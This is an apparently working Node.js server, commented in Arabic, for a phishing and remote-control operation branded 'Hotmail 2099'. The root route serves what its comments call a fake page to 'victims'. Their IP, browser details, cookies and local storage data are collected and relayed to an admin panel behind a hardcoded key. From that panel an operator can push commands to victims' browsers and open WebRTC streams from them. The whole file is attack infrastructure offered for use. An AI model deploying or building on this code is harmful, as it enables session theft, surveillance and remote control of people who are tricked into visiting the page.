const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const app = express();
const server = http.createServer(app);

// إعدادات CORS
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    credentials: true
}));

// Socket.io مع دعم Render
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"],
        credentials: true
    },
    transports: ['websocket', 'polling'],
    allowEIO3: true
});

// خدمة الملفات الثابتة
app.use(express.static(path.join(__dirname, 'public')));

// 🔴 مسار لوحة التحكم (للمطور فقط)
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin', 'admin.html'));
});

// 🔴 مسار صفحة الضحية (الصفحة المزيفة)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'victim', 'index.html'));
});

// مسار الفحص الصحي
app.get('/health', (req, res) => {
    res.json({ status: 'active', timestamp: Date.now() });
});

// 🔴 فصل الغرف: المطور في غرفة والضحايا في غرفة أخرى
let victims = new Map();    // الضحايا المتصلون
let admins = new Set();     // المطورين المتصلين

io.on('connection', (socket) => {
    const clientIP = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    console.log(`[+] اتصال جديد: ${socket.id} من IP: ${clientIP}`);

    // 🔴 تسجيل المطور في لوحة التحكم
    socket.on('admin_register', (credentials) => {
        // في وضع 2099، لا يوجد تحقق معقد
        if (credentials.key === 'ARCHITECT_2099') {
            admins.add(socket.id);
            socket.emit('admin_authenticated', {
                status: 'success',
                victims: Array.from(victims.values())
            });
            console.log(`[👑] مطور متصل: ${socket.id}`);
        } else {
            socket.emit('admin_authenticated', { status: 'denied' });
        }
    });

    // 🔴 تسجيل الضحية (تلقائي عند فتح الصفحة)
    socket.on('victim_register', (data) => {
        const victimEntry = {
            id: socket.id,
            ip: clientIP,
            userAgent: data.userAgent || navigator.userAgent,
            deviceName: data.deviceName || 'Unknown Device',
            platform: data.platform || 'Unknown',
            screenRes: data.screenRes || 'Unknown',
            browser: data.browser || 'Unknown',
            language: data.language || 'Unknown',
            cookies: data.cookies || 'No cookies',
            localData: data.localData || 'No local data',
            connectedAt: new Date().toISOString(),
            status: 'online'
        };
        
        victims.set(socket.id, victimEntry);
        
        // تحديث المطورين بقائمة الضحايا الجديدة
        admins.forEach(adminId => {
            io.to(adminId).emit('victims_update', Array.from(victims.values()));
        });
        
        console.log(`[🎯] ضحية جديدة متصلة: ${socket.id}`);
    });

    // 🔴 إرسال أوامر من المطور للضحية
    socket.on('admin_command', (payload) => {
        if (admins.has(socket.id) && victims.has(payload.victimId)) {
            io.to(payload.victimId).emit('execute_command', {
                action: payload.action,
                params: payload.params || {},
                from: socket.id
            });
            console.log(`[→] أمر "${payload.action}" من المطور إلى الضحية ${payload.victimId}`);
        }
    });

    // 🔴 استقبال البيانات من الضحية وإرسالها للمطور
    socket.on('victim_data', (data) => {
        if (victims.has(socket.id)) {
            admins.forEach(adminId => {
                io.to(adminId).emit('victim_response', {
                    victimId: socket.id,
                    type: data.type,
                    data: data.data,
                    timestamp: Date.now()
                });
            });
        }
    });

    // 🔴 بث مباشر من الضحية للمطور (WebRTC Signaling)
    socket.on('webrtc_offer', (data) => {
        if (admins.has(data.targetId)) {
            io.to(data.targetId).emit('webrtc_offer', {
                offer: data.offer,
                from: socket.id
            });
        }
    });

    socket.on('webrtc_answer', (data) => {
        if (victims.has(data.targetId)) {
            io.to(data.targetId).emit('webrtc_answer', {
                answer: data.answer,
                from: socket.id
            });
        }
    });

    socket.on('webrtc_ice', (data) => {
        io.to(data.targetId).emit('webrtc_ice', {
            candidate: data.candidate,
            from: socket.id
        });
    });

    // قطع الاتصال
    socket.on('disconnect', () => {
        if (admins.has(socket.id)) {
            admins.delete(socket.id);
            console.log(`[👑] مغادرة مطور: ${socket.id}`);
        }
        if (victims.has(socket.id)) {
            victims.delete(socket.id);
            admins.forEach(adminId => {
                io.to(adminId).emit('victims_update', Array.from(victims.values()));
            });
            console.log(`[🎯] مغادرة ضحية: ${socket.id}`);
        }
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`⚡ Hotmail 2099 Running on Port ${PORT}`);
    console.log(`🎯 Victim Link: https://your-app.onrender.com/`);
    console.log(`👑 Admin Link: https://your-app.onrender.com/admin`);
});
